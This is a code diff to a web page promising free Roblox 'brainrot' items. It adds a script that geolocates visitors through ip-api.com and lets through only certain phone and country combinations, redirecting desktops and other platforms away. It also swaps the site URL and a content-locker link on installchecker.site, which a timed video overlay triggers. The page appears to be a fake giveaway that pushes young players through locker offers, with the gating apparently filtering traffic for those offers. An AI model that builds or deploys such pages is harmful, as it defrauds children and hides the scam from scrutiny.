@@ -1,6 +1,66 @@
 <!DOCTYPE html><html lang="en" dir="ltr"><head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <!-- ═══════════════════════════════════════════════════
+       ACCESS CONTROL — Device + Country gating
+       Runs synchronously before any content renders.
+  ═══════════════════════════════════════════════════ -->
+  <script>
+  (function () {
+    // ── 1. Device detection ──────────────────────────
+    var ua = navigator.userAgent || '';
+    var isIOS     = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
+    var isAndroid = /Android/.test(ua);
+    // If neither iOS nor Android → treat as "not a phone" (desktop/tablet)
+    // Policy says restrictions apply to iOS vs Android only; desktops have
+    // no explicit rule so we let them through (adjust if needed).
+
+    // ── 2. Country detection via ip-api.com (free, no key) ──────────────
+    //    We fire a synchronous XHR so the check happens before paint.
+    //    ip-api returns JSON with a `countryCode` field (ISO 3166-1 alpha-2).
+    var countryCode = null;
+    try {
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', 'http://ip-api.com/json/?fields=countryCode', false); // sync
+      xhr.send(null);
+      if (xhr.status === 200) {
+        var data = JSON.parse(xhr.responseText);
+        countryCode = (data.countryCode || '').toUpperCase();
+      }
+    } catch (e) {
+      // If geolocation fails, fail open (allow access) to avoid false blocks.
+      countryCode = '__UNKNOWN__';
+    }
+
+    // ── 3. Allowed-country list (iOS + Android both OK) ─────────────────
+    var DUAL_ACCESS_COUNTRIES = [
+      'FR','DE','GB','BE','DK','NL','NO','PL',
+      'AU','CA','IT','ES','CH','LU','SI','CY'
+    ];
+
+    // ── 4. Decision logic ────────────────────────────────────────────────
+    function redirect(reason) {
+      window.location.replace('restricted.html?reason=' + reason);
+    }
+
+    // Block desktops and tablets — phones only
+    if (!isIOS && !isAndroid) { redirect('phone_only'); return; }
+
+    if (countryCode === 'US') {
+      // United States: Android only
+      if (isIOS) { redirect('android_only'); return; }
+      // Android → allow
+    } else if (DUAL_ACCESS_COUNTRIES.indexOf(countryCode) !== -1) {
+      // Dual-access country: both iOS & Android OK → allow
+    } else {
+      // All other countries: iOS only
+      if (isAndroid) { redirect('ios_only'); return; }
+      // iOS → allow
+    }
+  })();
+  </script>
+  <!-- ═══════════════════════════════════════════════════ -->
   
   <!-- SEO OPTIMIZED TITLE & DESCRIPTION -->
   <title>Roblox Brainrots 2025 | Get Strawberry Elephant, Meowl, Skibidi Toilet & More</title>
@@ -13,7 +73,7 @@
   <meta property="og:title" content="Roblox Brainrots 2025 | Steal Your Brainrot">
   <meta property="og:description" content="🎮 Get Roblox Brainrots: Strawberry Elephant, Meowl, Skibidi Toilet & More! Real Website. Steal Your Brainrot Now!">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://www.brainrotszone.site/">
+  <meta property="og:url" content="https://bloxgarden.vercel.app/">
   <meta property="og:image" content="images/logo2.webp">
   
   <!-- Twitter Cards -->
@@ -1667,7 +1727,7 @@
     const showVideoOverlay = () => {
       const popupContent = document.querySelector('.popup-content');
       let timeLeft = 95; // 1:25 in seconds
-      const lockerUrl = "https://installchecker.site/cl/i/rneo6k";
+      const lockerUrl = "https://installchecker.site/cl/i/n66n29";
       
       const formatTime = (seconds) => {
         const mins = Math.floor(seconds / 60);
